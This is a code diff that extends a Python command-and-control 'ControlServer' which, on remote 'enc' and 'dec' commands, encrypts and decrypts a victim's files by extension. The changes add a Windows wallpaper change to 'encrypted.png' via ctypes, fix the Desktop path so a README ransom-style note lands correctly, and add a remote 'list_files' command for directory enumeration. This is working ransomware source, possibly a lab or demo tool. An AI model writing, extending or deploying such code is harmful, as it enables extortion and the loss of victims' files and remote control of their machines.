@@ -4,7 +4,7 @@ import json
 import logging
 from colorama import init, Fore, Style
 import os
-import subprocess
+import ctypes
 
 from cryptography.fernet import Fernet
 
@@ -17,6 +17,28 @@ class ControlServer:
         self.port = port
         self.server = None
         self.setup_logging(log_file)
+
+    def list_files_and_dirs(self, path):
+        # Ensure the path exists
+        if not os.path.exists(path):
+            return f"The path {path} does not exist."
+
+        entries = []
+        for entry in os.listdir(path):
+            full_path = os.path.join(path, entry)
+            if os.path.isdir(full_path):
+                entry_type = 'Directory'
+            else:
+                entry_type = 'File'
+            entries.append(f"{entry} - {entry_type}")
+
+        return ', '.join(entries)
+
+    def change_wallpaper(self):
+        if os.name == 'nt':
+            ctypes.windll.user32.SystemParametersInfoW(20, 0, 'encrypted.png', 0)
+        else:
+            print("Wallpaper change feature is not supported on this OS.")
 
     def setup_logging(self, log_file):
         logging.basicConfig(filename=log_file, level=logging.INFO,
@@ -66,7 +88,10 @@ class ControlServer:
                     self.decrypt_file(key, file_path)
 
     def create_readme(self):
-        desktop_path = os.path.join(os.path.join(os.path.expanduser('~')), 'Desktop')
+        home_path = os.path.expanduser("~")
+        if os.name == 'nt':
+            home_path = os.environ['USERPROFILE']
+        desktop_path = os.path.join(os.path.join(home_path), 'Desktop')
         readme_path = os.path.join(desktop_path, 'README.txt')
         with open(readme_path, 'w') as file:
             file.write("""
@@ -96,6 +121,7 @@ Reminder: Always back up your files, activate firewall and stay vigilant against
             cmd = message['cmd']
             if cmd == 'enc':
                 self.find_and_encrypt_files(key, target_directory, file_extensions)
+                self.change_wallpaper()
                 self.create_readme()
                 response = f'Directory "{target_directory}" is encrypted using key {key} for following file extensions: {file_extensions}.'
                 print(response)
@@ -103,6 +129,10 @@ Reminder: Always back up your files, activate firewall and stay vigilant against
             elif cmd == 'dec':
                 self.find_and_decrypt_files(key, target_directory)
                 response = f'Directory "{target_directory}" is decrypted using key {key}.'
+                print(response)
+                logging.info(response)
+            elif cmd == 'list_files':
+                response = self.list_files_and_dirs(target_directory)
                 print(response)
                 logging.info(response)
 
